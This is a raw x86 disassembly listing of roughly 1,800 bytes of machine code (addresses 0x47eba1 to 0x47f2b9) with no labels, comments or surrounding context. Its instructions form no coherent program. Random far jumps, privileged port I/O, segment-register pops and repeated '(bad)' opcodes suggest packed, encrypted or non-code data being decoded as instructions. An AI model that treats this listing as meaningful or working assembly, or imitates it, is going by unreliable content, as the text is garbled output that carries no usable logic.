  47eba1:	ror    DWORD PTR [ebx+0x2b817bf1],0x28
  47eba8:	or     DWORD PTR [edx+0x33],ebp
  47ebab:	cmp    al,BYTE PTR [edi+0x70]
  47ebae:	loopne 0x47ebef
  47ebb0:	test   DWORD PTR ds:0x11692d92,eax
  47ebb6:	add    BYTE PTR [edi],ah
  47ebb8:	jo     0x47ebcf
  47ebba:	add    DWORD PTR [ecx+0x57],0x3a670cbb
  47ebc1:	pop    esi
  47ebc2:	add    eax,0xe1402dbb
  47ebc7:	cld    
  47ebc8:	mov    edi,0xb4691400
  47ebcd:	and    al,0xb2
  47ebcf:	dec    ax
  47ebd2:	je     0x47ebdd
  47ebd4:	gs push esp
  47ebd6:	mov    edx,0x1a16090c
  47ebdb:	add    al,0xf7
  47ebdd:	sbb    ch,BYTE PTR [edi]
  47ebdf:	loop   0x47eb67
  47ebe1:	push   ebp
  47ebe2:	hlt    
  47ebe3:	loopne 0x47ebd0
  47ebe5:	and    edx,DWORD PTR [ecx]
  47ebe7:	add    bl,BYTE PTR fs:[edi]
  47ebea:	stc    
  47ebeb:	sub    BYTE PTR [ebx+ebp*8],dh
  47ebee:	sbb    ah,BYTE PTR [ebx+ebp*8+0x11]
  47ebf2:	push   esi
  47ebf3:	add    DWORD PTR [eax-0x284e220c],ebp
  47ebf9:	and    eax,0x90365e2a
  47ebfe:	xchg   edx,eax
  47ebff:	inc    ebx
  47ec00:	dec    ebp
  47ec01:	xor    al,0x40
  47ec03:	shr    BYTE PTR [ebx+0x21],0x8c
  47ec07:	pop    ds
  47ec08:	inc    esi
  47ec09:	and    bl,al
  47ec0b:	push   edx
  47ec0c:	dec    ebx
  47ec0d:	mov    ecx,ss
  47ec0f:	jg     0x47ec50
  47ec11:	clc    
  47ec12:	mov    BYTE PTR [ebx+0x10bfc881],dl
  47ec18:	pop    ds
  47ec19:	fdivr  st,st(6)
  47ec1b:	and    ah,BYTE PTR [ecx+0x783b9a21]
  47ec21:	or     BYTE PTR [ebp+0xa],dh
  47ec24:	sbb    eax,0xd9176903
  47ec29:	add    esp,ecx
  47ec2b:	push   esp
  47ec2c:	adc    al,0x90
  47ec2e:	add    ebx,DWORD PTR [ecx+0x18141490]
  47ec34:	rcl    BYTE PTR [edx+0x18183909],cl
  47ec3a:	in     al,0xc5
  47ec3c:	dec    edi
  47ec3d:	adc    eax,0xf42702b7
  47ec42:	cmp    DWORD PTR [esi+0x33],0x46
  47ec46:	and    BYTE PTR [ebp+0xf635e04],bl
  47ec4c:	mov    dl,BYTE PTR [eax+0x7f2f49da]
  47ec52:	int    0x21
  47ec54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47ec55:	ror    bh,cl
  47ec57:	outs   dx,DWORD PTR ds:[esi]
  47ec58:	inc    ecx
  47ec59:	xor    BYTE PTR [ebp-0x56],dh
  47ec5c:	push   es
  47ec5d:	into   
  47ec5e:	mov    WORD PTR [eax],ss
  47ec60:	in     eax,0x74
  47ec62:	pop    es
  47ec63:	int3   
  47ec64:	xor    al,0xa5
  47ec66:	das    
  47ec67:	jns    0x47ecbe
  47ec69:	repz jbe 0x47ecad
  47ec6c:	sub    DWORD PTR ds:0xe4ba5d30,0x66
  47ec73:	out    dx,eax
  47ec74:	(bad)  
  47ec75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47ec76:	cmp    BYTE PTR [edi+0x36],bl
  47ec79:	mov    al,0xb
  47ec7b:	jns    0x47ec29
  47ec7d:	inc    ecx
  47ec7e:	cmp    BYTE PTR [edi-0x17],ch
  47ec81:	call   FWORD PTR [ebx+0x21]
  47ec84:	pop    esp
  47ec85:	mov    ecx,0x9ca10a3c
  47ec8a:	jns    0x47ec13
  47ec8c:	and    al,cl
  47ec8e:	xchg   ecx,eax
  47ec8f:	sbb    al,0xf0
  47ec91:	cmp    al,0x26
  47ec93:	in     al,dx
  47ec94:	aam    0xa5
  47ec96:	pop    edx
  47ec97:	push   0x3ee5c91a
  47ec9c:	dec    esp
  47ec9d:	push   esi
  47ec9e:	idiv   edi
  47eca0:	adc    eax,0xf66d8531
  47eca5:	fcomp  DWORD PTR [ebx]
  47eca7:	rcr    BYTE PTR [ecx+0x50a5be5d],0x67
  47ecae:	ins    BYTE PTR es:[edi],dx
  47ecaf:	push   cs
  47ecb0:	dec    edi
  47ecb1:	ins    BYTE PTR es:[edi],dx
  47ecb2:	push   edx
  47ecb3:	aas    
  47ecb4:	sbb    DWORD PTR [ebx],ebp
  47ecb6:	outs   dx,BYTE PTR ds:[esi]
  47ecb7:	push   0x4b9b43bc
  47ecbc:	leave  
  47ecbd:	xchg   ecx,eax
  47ecbe:	imul   esi,DWORD PTR [esi],0x7a
  47ecc1:	dec    eax
  47ecc2:	push   0x69cbbcc
  47ecc7:	jo     0x47ecef
  47ecc9:	cmp    DWORD PTR [esi+0x1e],ebp
  47eccc:	cdq    
  47eccd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47ecce:	xor    cl,BYTE PTR [ecx-0x20]
  47ecd1:	jo     0x47ecc7
  47ecd3:	xchg   BYTE PTR fs:[esi+ecx*1+0x59],dl
  47ecd8:	or     al,0x44
  47ecda:	push   0x6dd5b424
  47ecdf:	and    ch,BYTE PTR [eax-0x90abfcb]
  47ece5:	jmp    0x68b54d14
  47ecea:	cmp    al,0x69
  47ecec:	test   BYTE PTR [eax+0x41],al
  47ecef:	cmp    al,0xca
  47ecf1:	jae    0x47ec83
  47ecf3:	add    eax,DWORD PTR [esp+eiz*8+0x6c]
  47ecf7:	inc    esp
  47ecf8:	cmp    al,0x7
  47ecfa:	cmp    DWORD PTR [eax+0x6a844854],edx
  47ed00:	dec    eax
  47ed01:	gs nop
  47ed03:	add    ebp,DWORD PTR [ecx+0x6744c6c]
  47ed09:	cmp    DWORD PTR [eax+0x50844c4a],edx
  47ed0f:	jl     0x47eca1
  47ed11:	add    ebp,DWORD PTR [ecx+0x54985054]
  47ed17:	cmp    DWORD PTR [eax+0x6c9473ca],edx
  47ed1d:	push   esp
  47ed1e:	lods   al,BYTE PTR ds:[esi]
  47ed1f:	pop    eax
  47ed20:	add    ebp,DWORD PTR [ecx+0x588c0654]
  47ed26:	les    ecx,FWORD PTR [eax]
  47ed28:	cmp    BYTE PTR [ebp-0x70],ah
  47ed2b:	pop    esp
  47ed2c:	pushf  
  47ed2d:	sbb    ecx,ebp
  47ed2f:	push   es
  47ed30:	lock (bad) 
  47ed32:	fldenv [ebx+0x6f]
  47ed35:	ins    DWORD PTR es:[edi],dx
  47ed36:	arpl   WORD PTR [edi+eax*4+0xa],si
  47ed3a:	inc    esi
  47ed3b:	cdq    
  47ed3c:	xor    eax,0xadb05e49
  47ed41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47ed42:	sub    DWORD PTR [edx-0x78],0x4253c646
  47ed49:	shr    BYTE PTR [esp+esi*1-0x2d],0x27
  47ed4e:	push   ebp
  47ed4f:	sub    ecx,DWORD PTR [edi]
  47ed51:	pop    edi
  47ed52:	inc    eax
  47ed53:	ficom  WORD PTR [eax]
  47ed55:	xchg   BYTE PTR [edi+eax*4+0x4f737205],ch
  47ed5c:	stos   BYTE PTR es:[edi],al
  47ed5d:	push   edi
  47ed5e:	das    
  47ed5f:	push   ebx
  47ed60:	or     eax,0x45e16861
  47ed65:	outs   dx,BYTE PTR ds:[esi]
  47ed66:	and    al,0xd6
  47ed68:	call   0x770a:0x5fedc6c6
  47ed6f:	sub    esi,DWORD PTR [ebx-0x402b7e50]
  47ed75:	repz das 
  47ed77:	sub    bh,BYTE PTR [eax]
  47ed79:	add    dl,BYTE PTR [esi+0x7b]
  47ed7c:	pop    ds
  47ed7d:	ins    BYTE PTR es:[edi],dx
  47ed7e:	mov    ch,0x54
  47ed80:	lock outs dx,DWORD PTR ds:[esi]
  47ed82:	jae    0x47ed9b
  47ed84:	daa    
  47ed85:	jg     0x47ed23
  47ed87:	pop    edx
  47ed88:	mov    eax,ds:0x97df535d
  47ed8d:	add    DWORD PTR [ebp+0x2e],eax
  47ed90:	in     al,0x25
  47ed92:	xchg   DWORD PTR [eax+0x8],esp
  47ed95:	inc    ebp
  47ed96:	pusha  
  47ed97:	stos   DWORD PTR es:[edi],eax
  47ed98:	test   BYTE PTR [ecx+0x68463241],al
  47ed9e:	ds repnz adc eax,0x70a7a8a5
  47eda5:	inc    ebp
  47eda6:	inc    edx
  47eda7:	push   es
  47eda8:	mov    esi,0x56e80437
  47edad:	in     al,dx
  47edae:	push   es
  47edaf:	push   cs
  47edb0:	push   esp
  47edb1:	not    BYTE PTR [ebx+0x5d518890]
  47edb7:	nop
  47edb8:	int3   
  47edb9:	(bad)  
  47edba:	mov    ah,0xf3
  47edbc:	sahf   
  47edbd:	mov    edx,esp
  47edbf:	sbb    al,0xe
  47edc1:	sbb    al,0xc7
  47edc3:	loope  0x47ed64
  47edc5:	xlat   BYTE PTR ds:[ebx]
  47edc6:	push   cs
  47edc7:	xor    BYTE PTR [esi+0x3e],al
  47edca:	pusha  
  47edcb:	push   es
  47edcc:	ins    BYTE PTR es:[edi],dx
  47edcd:	adc    BYTE PTR [ebx+eax*2+0x72],dl
  47edd1:	imul   esi,DWORD PTR [esp+ebp*4-0x15],0xc4535f65
  47edd9:	aas    
  47edda:	xchg   BYTE PTR [edx],bh
  47eddc:	and    eax,0x457062d
  47ede1:	adc    dl,BYTE PTR [eax]
  47ede3:	sbb    ebx,DWORD PTR [eax-0x51]
  47ede6:	test   eax,0x5fde0315
  47edeb:	push   esp
  47edec:	or     BYTE PTR [edi+0x20],0xd3
  47edf0:	inc    eax
  47edf1:	mov    BYTE PTR [eax+0x1f],dh
  47edf4:	add    al,0x81
  47edf6:	and    eax,0xb71c889c
  47edfb:	dec    esp
  47edfc:	repnz or dh,BYTE PTR [ebx+0x4]
  47ee00:	push   edi
  47ee01:	lods   eax,DWORD PTR ds:[esi]
  47ee02:	inc    esi
  47ee03:	je     0x47ee37
  47ee05:	adc    al,0xe0
  47ee07:	xor    BYTE PTR [esi+eax*2-0x25708b79],0x51
  47ee0f:	pop    fs
  47ee11:	inc    eax
  47ee12:	mov    bl,BYTE PTR [ebx+0x36]
  47ee15:	je     0x47eddf
  47ee17:	ja     0x47ee4d
  47ee19:	imul   edi
  47ee1b:	nop
  47ee1c:	dec    eax
  47ee1d:	cmp    al,0x30
  47ee1f:	add    BYTE PTR [esi+0x6],bh
  47ee22:	dec    DWORD PTR ds:0xbe381c11
  47ee28:	ja     0x47ee34
  47ee2a:	mov    al,ds:0x18376810
  47ee2f:	test   DWORD PTR [ebx+0x53],ebx
  47ee32:	loopne 0x47edb5
  47ee34:	jnp    0x47edd7
  47ee36:	xor    DWORD PTR [ebx-0x58],ecx
  47ee39:	push   0x2e464619
  47ee3e:	lahf   
  47ee3f:	or     al,0x78
  47ee41:	mov    DWORD PTR [eax+eax*4-0x7c],edi
  47ee45:	inc    esi
  47ee46:	inc    esi
  47ee47:	inc    esi
  47ee48:	inc    esi
  47ee49:	mov    BYTE PTR [eax+edx*4+0x46464694],cl
  47ee50:	inc    esi
  47ee51:	cwde   
  47ee52:	pushf  
  47ee53:	mov    al,ds:0x464646a4
  47ee58:	inc    esi
  47ee59:	test   al,0xac
  47ee5b:	mov    al,0xb4
  47ee5d:	inc    esi
  47ee5e:	inc    esi
  47ee5f:	inc    esi
  47ee60:	inc    esi
  47ee61:	mov    eax,0x46c4c0bc
  47ee66:	inc    esi
  47ee67:	inc    esi
  47ee68:	inc    esi
  47ee69:	enter  0xd0cc,0xd4
  47ee6d:	inc    esi
  47ee6e:	inc    esi
  47ee6f:	inc    esi
  47ee70:	inc    esi
  47ee71:	fcomp  st(4)
  47ee73:	loopne 0x47ee59
  47ee75:	inc    esi
  47ee76:	inc    esi
  47ee77:	inc    esi
  47ee78:	inc    esi
  47ee79:	call   0x2f3cdf6a
  47ee7e:	inc    edi
  47ee7f:	inc    esi
  47ee80:	inc    esi
  47ee81:	clc    
  47ee82:	cld    
  47ee83:	add    BYTE PTR [edx+0x46464604],cl
  47ee89:	inc    esi
  47ee8a:	or     BYTE PTR [eax+edx*1],cl
  47ee8d:	adc    al,0x46
  47ee8f:	inc    esi
  47ee90:	inc    esi
  47ee91:	inc    esi
  47ee92:	sbb    BYTE PTR [eax+eiz*1],bl
  47ee95:	and    al,0x5a
  47ee97:	inc    esi
  47ee98:	inc    esi
  47ee99:	inc    esi
  47ee9a:	sub    BYTE PTR [eax+esi*1],ch
  47ee9d:	lea    esp,[edx-0x4f]
  47eea0:	sbb    bh,bh
  47eea2:	sub    al,0x51
  47eea4:	mov    WORD PTR [eax],?
  47eea6:	ret    0xfd69
  47eea9:	pop    edi
  47eeaa:	mov    ss,WORD PTR [ebx]
  47eeac:	test   ebx,eax
  47eeae:	mov    ebx,0x4c338de7
  47eeb3:	adc    DWORD PTR [esi],ecx
  47eeb5:	mov    esp,0x3b7b9178
  47eeba:	pop    eax
  47eebb:	arpl   WORD PTR [ebx],ax
  47eebd:	test   ch,bl
  47eebf:	arpl   WORD PTR [ebx],ax
  47eec1:	mov    eax,0x3393244
  47eec6:	sub    DWORD PTR [esi-0x6ac7acb1],eax
  47eecc:	dec    esi
  47eecd:	push   eax
  47eece:	push   ecx
  47eecf:	sbb    eax,ebx
  47eed1:	rol    DWORD PTR [ecx+0x23607852],cl
  47eed7:	jl     0x47ef19
  47eed9:	sub    al,BYTE PTR [ebx]
  47eedb:	push   edx
  47eedc:	jo     0x47ee5e
  47eede:	test   BYTE PTR [ecx-0x7b9ab7f4],dl
  47eee4:	xchg   esp,eax
  47eee5:	mov    BYTE PTR [edx+0x19],dl
  47eee8:	nop
  47eee9:	retf   0xb48c
  47eeec:	nop
  47eeed:	enter  0x4065,0x2a
  47eef1:	add    edx,DWORD PTR [esp+ebx*8+0xcac9798]
  47eef8:	dec    eax
  47eef9:	lock pushf 
  47eefb:	or     al,0x4d
  47eefd:	mov    al,ds:0x2a406548
  47ef02:	and    al,0xa4
  47ef04:	xor    al,0x95
  47ef06:	add    DWORD PTR [ecx-0x53bb57f4],ebp
  47ef0c:	pop    eax
  47ef0d:	push   es
  47ef0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47ef0f:	xor    ah,BYTE PTR [eax]
  47ef11:	mov    al,0x80
  47ef13:	mov    ah,0x90
  47ef15:	retf   0x5480
  47ef18:	nop
  47ef19:	mov    eax,0x52032aa0
  47ef1e:	sbb    DWORD PTR [eax+esi*4+0x480cc0c0],edi
  47ef25:	gs inc eax
  47ef27:	(bad)  
  47ef28:	int3   
  47ef29:	enter  0x9520,0x1
  47ef2d:	test   eax,0xa9f4cce0
  47ef32:	pop    esp
  47ef33:	mov    dl,0x32
  47ef35:	rol    BYTE PTR [esi+ecx*2],1
  47ef38:	aam    0x14
  47ef3a:	xor    ah,BYTE PTR [eax]
  47ef3c:	xchg   ebp,eax
  47ef3d:	add    eax,ebx
  47ef3f:	and    al,0xdc
  47ef41:	adc    BYTE PTR [esi+eax*1-0x5c],0x34
  47ef46:	loopne 0x47ef94
  47ef48:	push   edx
  47ef49:	sbb    DWORD PTR [eax-0x17a31b36],edx
  47ef4f:	jo     0x47efb6
  47ef51:	inc    eax
  47ef52:	sub    al,BYTE PTR [ebx]
  47ef54:	in     al,dx
  47ef55:	test   al,dh
  47ef57:	add    DWORD PTR [ecx-0xb63b7f4],ebp
  47ef5d:	lods   al,BYTE PTR ds:[esi]
  47ef5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47ef5f:	xor    ah,BYTE PTR [eax]
  47ef61:	xchg   ebp,eax
  47ef62:	clc    
  47ef63:	mov    esp,0x80caccfc
  47ef68:	cmp    al,0x7
  47ef6a:	add    BYTE PTR [edx+0x592e04e0],cl
  47ef70:	sbb    DWORD PTR [eax+0x4f0008f0],edx
  47ef76:	or     al,0x90
  47ef78:	retf   0x5480
  47ef7b:	or     al,0x10
  47ef7d:	sbb    al,0x2a
  47ef7f:	add    edx,DWORD PTR [edx+0x19]
  47ef82:	adc    al,0x38
  47ef84:	sbb    BYTE PTR [esp+ecx*1+0x48],dl
  47ef88:	gs inc eax
  47ef8a:	sbb    al,0x6c
  47ef8c:	and    BYTE PTR [eax],ah
  47ef8e:	xchg   ebp,eax
  47ef8f:	add    DWORD PTR [ecx+0x54982484],ebp
  47ef95:	push   es
  47ef96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47ef97:	xor    ch,BYTE PTR [eax]
  47ef99:	mov    eax,0x7d51d42c
  47ef9e:	rol    DWORD PTR [eax+0x4597d730],cl
  47efa4:	push   DWORD PTR [edi+0x2b]
  47efa7:	or     eax,0x4c3ae4ac
  47efac:	test   DWORD PTR [eax-0x23f7fb01],ecx
  47efb2:	js     0x47f028
  47efb4:	push   0x80656d65
  47efb9:	sti    
  47efba:	xor    al,0x65
  47efbc:	or     eax,0x841b5458
  47efc1:	mov    ch,0x9f
  47efc3:	adc    esp,ecx
  47efc5:	inc    ebx
  47efc6:	ins    BYTE PTR es:[edi],dx
  47efc7:	outs   dx,DWORD PTR ds:[esi]
  47efc8:	jae    0x47f02f
  47efca:	and    DWORD PTR [ecx],edx
  47efcc:	test   edi,esi
  47efce:	and    dh,dh
  47efd0:	sbb    eax,0x184b729d
  47efd5:	dec    ebx
  47efd6:	daa    
  47efd7:	shr    DWORD PTR [ebp+0x6a],0x31
  47efdb:	pop    ss
  47efdc:	adc    BYTE PTR [ebp+0x5f],al
  47efdf:	sbb    ecx,DWORD PTR [edx]
  47efe1:	out    0x79,al
  47efe3:	add    al,0xd2
  47efe5:	aas    
  47efe6:	push   eax
  47efe7:	popa   
  47efe8:	jb     0x47efc6
  47efea:	fiadd  DWORD PTR [ecx]
  47efec:	mov    BYTE PTR [esp+eiz*2+0x0],dh
  47eff0:	daa    
  47eff1:	test   DWORD PTR [edx],ecx
  47eff3:	mov    DWORD PTR ds:0x27743906,esi
  47eff9:	es mov ah,0xd4
  47effc:	push   esi
  47effd:	jne    0x47efb6
  47efff:	test   al,0x67
  47f001:	inc    esp
  47f002:	add    eax,0x87766da1
  47f007:	dec    eax
  47f008:	imul   esp,DWORD PTR [ebp+0x73],0xd3bf673f
  47f00f:	pop    esi
  47f010:	js     0x47f057
  47f012:	fs scas al,BYTE PTR es:[edi]
  47f014:	pop    ds
  47f015:	dec    ecx
  47f016:	arpl   WORD PTR [ecx+0x49],si
  47f019:	jae    0x47f05d
  47f01b:	and    al,0x61
  47f01d:	add    al,0x1d
  47f01f:	dec    esp
  47f020:	cs mov cl,0xd7
  47f023:	or     BYTE PTR [esi+0x64],bh
  47f026:	daa    
  47f027:	lea    edi,[edx]
  47f029:	or     al,0xec
  47f02b:	mul    BYTE PTR ds:0x54796c0c
  47f031:	jp     0x47f0a1
  47f033:	jae    0x47f0a5
  47f035:	sbb    al,BYTE PTR [edx+ebx*4-0x4b]
  47f039:	test   DWORD PTR ds:0x281f6f6f,edx
  47f03f:	sub    DWORD PTR ds:0xc61f5fc1,ebp
  47f045:	add    al,0x90
  47f047:	jbe    0x47f030
  47f049:	pop    ds
  47f04a:	sbb    DWORD PTR [eax],0x5f6b0313
  47f050:	ficom  WORD PTR [edi]
  47f052:	jl     0x47efd5
  47f054:	ret    0x8641
  47f057:	jmp    0x35d27648
  47f05c:	push   edi
  47f05d:	or     al,0x69
  47f05f:	adc    al,0x67
  47f061:	add    bh,BYTE PTR [ebx]
  47f063:	pop    ebx
  47f064:	or     BYTE PTR [esi],ch
  47f066:	pop    ds
  47f067:	and    DWORD PTR [eax],0x5
  47f06a:	sbb    edi,DWORD PTR [ebp+0x5b344807]
  47f070:	adc    DWORD PTR [ebx+0x2],ebp
  47f073:	push   esi
  47f074:	(bad)  
  47f075:	mov    esp,0x9e2085cf
  47f07a:	dec    eax
  47f07b:	xor    BYTE PTR ds:[ecx+0x29],bh
  47f07f:	cwde   
  47f080:	jbe    0x47f004
  47f082:	dec    edi
  47f083:	xor    al,0x4e
  47f085:	outs   dx,BYTE PTR ds:[esi]
  47f086:	push   ebx
  47f087:	add    eax,0xef77b5a9
  47f08c:	cmp    ecx,edi
  47f08e:	repnz pusha 
  47f090:	push   es
  47f091:	(bad)  
  47f092:	outs   dx,BYTE PTR ds:[esi]
  47f093:	outs   dx,BYTE PTR ds:[esi]
  47f094:	popa   
  47f095:	and    dh,BYTE PTR [edi+0x5216d682]
  47f09b:	pop    ebx
  47f09c:	in     eax,0x27
  47f09e:	in     eax,0xc5
  47f0a0:	fiadd  DWORD PTR [ecx+0x62]
  47f0a3:	das    
  47f0a4:	fstp   QWORD PTR [edi]
  47f0a6:	in     eax,dx
  47f0a7:	ret    
  47f0a8:	fcmovb st,st(1)
  47f0aa:	ficomp DWORD PTR [edi]
  47f0ac:	xchg   ebp,eax
  47f0ad:	pop    ds
  47f0ae:	pop    ebp
  47f0af:	inc    esi
  47f0b0:	xor    DWORD PTR [eax],ebx
  47f0b2:	ins    BYTE PTR es:[edi],dx
  47f0b3:	xchg   DWORD PTR [edi+ebp*1+0xa],edi
  47f0b7:	pop    ss
  47f0b8:	xchg   DWORD PTR [ecx+ebx*2],edx
  47f0bb:	ja     0x47f0cf
  47f0bd:	sar    DWORD PTR [ebp+0x46],0xde
  47f0c1:	and    eax,0xf17f5664
  47f0c6:	and    dl,cl
  47f0c8:	xor    ecx,esp
  47f0ca:	jns    0x47f140
  47f0cc:	outs   dx,DWORD PTR ds:[esi]
  47f0cd:	addr16 mov bl,0xd4
  47f0d0:	into   
  47f0d1:	in     eax,dx
  47f0d2:	xchg   ecx,eax
  47f0d3:	jne    0x47f147
  47f0d5:	ins    DWORD PTR es:[edi],dx
  47f0d6:	outs   dx,BYTE PTR ds:[esi]
  47f0d7:	das    
  47f0d8:	pop    edi
  47f0d9:	fs jo  0x47f0b8
  47f0dc:	jo     0x47f141
  47f0de:	out    0xb2,eax
  47f0e0:	inc    ebp
  47f0e1:	imul   ebp,DWORD PTR [esi+edx*8-0x5fe727d3],0x88155e2f
  47f0ec:	in     al,dx
  47f0ed:	xchg   ebx,eax
  47f0ee:	inc    ebp
  47f0ef:	cmp    eax,0xf14e2088
  47f0f4:	mov    cl,0x87
  47f0f6:	inc    esp
  47f0f7:	outs   dx,DWORD PTR ds:[esi]
  47f0f8:	arpl   WORD PTR [eax+0xc288132],bx
  47f0fe:	fiadd  WORD PTR [edi+0x41507e1]
  47f104:	mov    ds:0x5d93508f,al
  47f109:	outs   dx,DWORD PTR ds:[esi]
  47f10a:	adc    al,0x5e
  47f10c:	mov    BYTE PTR [edi+0x1b76f307],al
  47f112:	ins    BYTE PTR es:[edi],dx
  47f113:	inc    eax
  47f114:	add    esp,DWORD PTR [edi+0x121410de]
  47f11a:	ins    DWORD PTR es:[edi],dx
  47f11b:	pop    esp
  47f11c:	mov    eax,ds:0x56d3801
  47f121:	dec    edi
  47f122:	enter  0x4264,0x2c
  47f126:	out    dx,eax
  47f127:	hlt    
  47f128:	push   esp
  47f129:	outs   dx,BYTE PTR ds:[esi]
  47f12a:	(bad)  
  47f12b:	out    0x90,al
  47f12d:	push   eax
  47f12e:	xor    al,0x75
  47f130:	and    DWORD PTR [ebx+0x6f5da10e],edx
  47f136:	mov    ebp,0x7f1bbc01
  47f13b:	repnz daa 
  47f13d:	dec    edi
  47f13e:	(bad)  
  47f13f:	xchg   edx,eax
  47f140:	xlat   BYTE PTR ds:[ebx]
  47f141:	aad    0x5b
  47f143:	push   eax
  47f144:	push   ds
  47f145:	sub    eax,0x71980c79
  47f14a:	test   BYTE PTR [esi-0x7eba7ffe],ah
  47f150:	jbe    0x47f11f
  47f152:	pop    ebp
  47f153:	xor    eax,0xde71a3ec
  47f158:	enter  0x158,0xa0
  47f15c:	test   eax,0x3ed0bc66
  47f161:	jo     0x47f122
  47f163:	cmp    BYTE PTR [eax+0x71],cl
  47f166:	inc    esi
  47f167:	push   edi
  47f168:	test   al,0xc4
  47f16a:	pop    es
  47f16b:	push   edx
  47f16c:	mov    esi,0x658420dd
  47f171:	push   0x4c
  47f173:	jbe    0x47f1f1
  47f175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47f176:	or     eax,0xae97ccfc
  47f17b:	sub    esp,DWORD PTR es:[eax]
  47f17e:	ins    DWORD PTR es:[edi],dx
  47f17f:	and    edi,ebx
  47f181:	out    dx,al
  47f182:	jg     0x47f117
  47f184:	and    BYTE PTR [eax],ah
  47f186:	xor    dh,BYTE PTR [eax]
  47f188:	xor    BYTE PTR [ecx],dh
  47f18a:	sub    al,0xb
  47f18c:	xor    ah,BYTE PTR [eax]
  47f18e:	dec    ebp
  47f18f:	imul   ebp,DWORD PTR [ebx+0x30],0xa0b7d3ae
  47f196:	fldenv [ebx+0x68]
  47f199:	push   cs
  47f19a:	dec    esi
  47f19b:	(bad)  
  47f19c:	fadd   QWORD PTR [eax]
  47f19e:	je     0x47f1a2
  47f1a0:	outs   dx,DWORD PTR ds:[esi]
  47f1a1:	add    BYTE PTR [ebp+0x6b],dl
  47f1a4:	retf   
  47f1a5:	scas   eax,DWORD PTR es:[edi]
  47f1a6:	jmp    0x63:0x166c0400
  47f1ad:	imul   edx,DWORD PTR [edx],0x6d
  47f1b0:	inc    edx
  47f1b1:	mov    ebx,0x6fdf7b06
  47f1b6:	pop    es
  47f1b7:	js     0x47f1f8
  47f1b9:	fs loop 0x47f225
  47f1bc:	pop    esi
  47f1bd:	pop    ss
  47f1be:	loop   0x47f19e
  47f1c0:	sti    
  47f1c1:	fisub  WORD PTR [esi]
  47f1c3:	jo     0x47f224
  47f1c5:	jb     0x47f1dd
  47f1c7:	jb     0x47f213
  47f1c9:	popa   
  47f1ca:	or     bh,BYTE PTR [ebx-0x21]
  47f1cd:	fst    QWORD PTR [ebx]
  47f1cf:	cmp    bl,BYTE PTR [edx]
  47f1d1:	popa   
  47f1d2:	dec    esi
  47f1d3:	es dec edi
  47f1d5:	ins    BYTE PTR es:[edi],dx
  47f1d6:	bound  esi,QWORD PTR [ebx+0x66]
  47f1d9:	jecxz  0x47f190
  47f1db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47f1dc:	fnsave [esi+0xe]
  47f1df:	es ja  0x47f190
  47f1e2:	gs loop 0x47f25a
  47f1e5:	mul    DWORD PTR [esi-0x19]
  47f1e8:	jge    0x47f199
  47f1ea:	pop    edx
  47f1eb:	addr16 pop ss
  47f1ed:	jb     0x47f18d
  47f1ef:	addr16 mov ds:0xdbde,eax
  47f1f3:	(bad)  
  47f1f5:	jae    0x47f1f9
  47f1f7:	add    BYTE PTR [edi],dl
  47f1f9:	mov    bh,0x22
  47f1fb:	arpl   WORD PTR [ebx-0x23],ax
  47f1fe:	xor    BYTE PTR [esi+0x276ca6d6],0x6a
  47f205:	imul   edi,DWORD PTR [edi-0x32],0xf7cf6bbb
  47f20c:	sub    esi,DWORD PTR [ebx+ebp*4+0x6e]
  47f210:	ins    BYTE PTR es:[edi],dx
  47f211:	das    
  47f212:	je     0x47f1f6
  47f214:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47f215:	popa   
  47f216:	scas   eax,DWORD PTR es:[edi]
  47f217:	ins    DWORD PTR es:[edi],dx
  47f218:	fistp  WORD PTR [ebx]
  47f21a:	bound  ecx,QWORD PTR [edi]
  47f21c:	and    ch,BYTE PTR [ebx-0x69]
  47f21f:	pop    edx
  47f220:	mov    ebx,0x9aec5b87
  47f225:	daa    
  47f226:	mov    esi,0x251fe23b
  47f22b:	out    dx,eax
  47f22c:	jnp    0x47f275
  47f22e:	je     0x47f21a
  47f230:	jo     0x47f251
  47f232:	jb     0x47f296
  47f234:	arpl   WORD PTR [eax+0x27b0defb],si
  47f23a:	jns    0x47f1e2
  47f23c:	outs   dx,DWORD PTR ds:[esi]
  47f23d:	dec    edi
  47f23e:	pushw  ss
  47f240:	das    
  47f241:	idiv   BYTE PTR [ebp+0x265dc35]
  47f247:	pop    ss
  47f248:	or     ch,BYTE PTR [ecx-0x9]
  47f24b:	outs   dx,DWORD PTR ds:[esi]
  47f24c:	pop    ds
  47f24d:	pop    es
  47f24e:	xor    BYTE PTR [esi-0x39],cl
  47f251:	loopne 0x47f29b
  47f253:	pop    ecx
  47f254:	xlat   BYTE PTR ds:[ebx]
  47f255:	popa   
  47f256:	inc    edx
  47f257:	test   al,0xa0
  47f259:	mov    edx,0x3123a358
  47f25e:	call   0x9e94e69
  47f263:	mov    edi,0xffc7bf11
  47f268:	fdivr  QWORD PTR [eax]
  47f26a:	jl     0x47f1f4
  47f26c:	inc    esi
  47f26d:	add    eax,0x223e28b8
  47f272:	mov    bl,0xa4
  47f274:	cmp    eax,0x23d44553
  47f279:	setae  BYTE PTR ss:[eax+0x4]
  47f27e:	adc    al,0x46
  47f280:	add    al,0xda
  47f282:	sbb    DWORD PTR [ebx+0x2c],ecx
  47f285:	(bad)  [ecx+0x7cda4d4]
  47f28b:	xlat   BYTE PTR ds:[ebx]
  47f28c:	data16 loop 0x47f278
  47f28f:	lds    esp,FWORD PTR [edi+0x5f37d443]
  47f295:	jecxz  0x47f2cc
  47f297:	mov    DWORD PTR [ecx+0x6e060f57],ecx
  47f29d:	imul   eax,DWORD PTR [edx],0x7c157406
  47f2a3:	xchg   BYTE PTR [eax],cl
  47f2a5:	xchg   ebx,eax
  47f2a6:	ret    0x57
  47f2a9:	aam    0xfb
  47f2ab:	and    edi,0xffffffd9
  47f2ae:	cmp    BYTE PTR [ebx],bl
  47f2b0:	ja     0x47f2be
  47f2b2:	mov    ebp,0xe05267a8
  47f2b7:	xor    ecx,DWORD PTR [ecx]
  47f2b9:	xor    BYTE PTR [edx-0x41bb76a1],0x8
